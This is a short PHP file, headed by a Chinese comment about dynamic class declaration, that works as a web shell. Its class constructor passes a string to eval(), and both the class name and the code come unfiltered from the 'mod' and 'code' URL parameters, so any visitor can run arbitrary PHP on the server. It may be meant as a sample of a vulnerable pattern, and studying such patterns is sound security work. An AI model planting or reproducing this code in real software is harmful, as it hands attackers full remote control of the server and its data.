<?php
/* 
 * 动态类声明分析
 */
class index{
    function __construct($code = '') {
        if($code != false)
            eval($code);
        else
            echo "hi";
    }
}
$mod = isset($_GET['mod'])?$_GET['mod']:'index';
$code = isset($_GET['code'])?$_GET['code']:'phpinfo();';

$obj = new $mod($code);
